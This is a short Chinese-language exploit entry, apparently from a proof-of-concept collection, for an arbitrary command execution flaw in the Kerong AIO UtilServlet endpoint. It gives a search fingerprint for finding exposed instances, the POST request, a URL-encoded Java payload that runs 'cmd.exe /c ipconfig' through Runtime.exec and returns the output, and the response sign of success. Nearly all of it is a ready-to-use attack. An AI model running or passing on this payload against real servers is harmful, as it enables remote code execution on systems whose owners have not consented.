# 科荣AIOUtilServlet存在任意命令执行漏洞

科荣 ｜ 命令执行 ｜ —
- **指纹**：`body="changeAccount('8000')"`
- **请求**：`POST /UtilServlet HTTP/1.1`

**Payload**
```
operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+ipconfig").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field
```
- **响应特征**：200 IP